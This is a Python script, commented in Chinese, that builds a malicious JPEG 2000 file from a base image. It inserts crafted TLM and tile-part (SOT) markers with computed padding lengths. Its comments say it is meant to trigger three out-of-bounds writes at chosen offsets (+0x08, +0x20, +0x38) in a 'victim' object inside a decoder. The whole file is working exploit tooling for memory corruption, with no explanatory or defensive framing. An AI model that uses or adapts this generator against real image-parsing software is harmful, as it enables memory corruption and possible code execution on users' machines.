#!/usr/bin/env python3
# mk13: 三段 OOB 写（tpsno = N, N+1, N+2）=> victim 的 +0x08 / +0x20 / +0x38
#   满足单调约束：A < B < C
#   mk13.py <base> <out> <tile> <N> <A> <B> <C> <e1> <e2> <e3>
import struct, sys

BASE, OUT = sys.argv[1], sys.argv[2]
TILE, N = int(sys.argv[3]), int(sys.argv[4])
A, B, C = int(sys.argv[5], 0), int(sys.argv[6], 0), int(sys.argv[7], 0)
E1 = int(sys.argv[8]) if len(sys.argv) > 8 else 0
E2 = int(sys.argv[9]) if len(sys.argv) > 9 else 0
E3 = int(sys.argv[10]) if len(sys.argv) > 10 else 0

if not (A < B < C):
    print('ORDER'); sys.exit(1)

d = bytearray(open(BASE, 'rb').read())
eoc = d.rfind(b'\xff\xd9')
soc = d.find(b'\xff\x4f'); si = d.find(b'\xff\x51', soc)
siz_end = si + 2 + struct.unpack('>H', d[si+2:si+4])[0]
ntiles = 4
tlm_entries = N + (ntiles - 1) * 1
head = siz_end + (4 + 3 * tlm_entries)

# 目标：v2(N)=A, v2(N+1)=B, v2(N+2)=C
#   v2(i) = S_{i+1} - 10 ; part N 的 SOD 偏移 S_N 满足 v2(N)=S_N+14-10=A
S_N = A - 4
p1 = S_N - head - (N - 2) * 14 - 12 + E1
pB = B - A - 14 + E2
pC = C - B - 14 + E3
if p1 < 0 or pB < 0 or pC < 0:
    print('NEG', p1, pB, pC); sys.exit(1)

plens = [0] * (N + 2)
plens[0] = p1
plens[N] = pB          # tpsno = N+1  -> +0x20
plens[N + 1] = pC      # tpsno = N+2  -> +0x38

extra = b''
for k in range(N + 2):                 # tpsno = 1 .. N+2
    pl = plens[k]
    payload = b'A' * pl if pl else b''
    psot = 14 + pl
    extra += (b'\xff\x90' + struct.pack('>H', 10) + struct.pack('>H', TILE) +
              struct.pack('>I', psot) + bytes([1 + k, 0]) + b'\xff\x93' + payload)
buf = bytearray(bytes(d[:eoc]) + extra + bytes(d[eoc:]))

ents = b''
for t in range(ntiles):
    cnt = N if t == TILE else 1
    for _ in range(cnt):
        ents += bytes([t]) + struct.pack('>H', 1)
TLM = b'\xff\x55' + struct.pack('>H', 4 + len(ents)) + bytes([0, 0x10]) + ents
buf = bytearray(bytes(buf[:siz_end]) + TLM + bytes(buf[siz_end:]))

# TPsot 全置 0（让每个 part 独立）
i = siz_end + len(TLM)
while i < len(buf) - 12:
    if buf[i] == 0xFF and buf[i + 1] == 0x90:
        L = struct.unpack('>H', buf[i + 2:i + 4])[0]
        buf[i + 11] = 0
        i += 2 + L
    else:
        i += 1
open(OUT, 'wb').write(bytes(buf))
print('OK len=%d p1=%d pB=%d pC=%d S_N=%#x' % (len(buf), p1, pB, pC, S_N))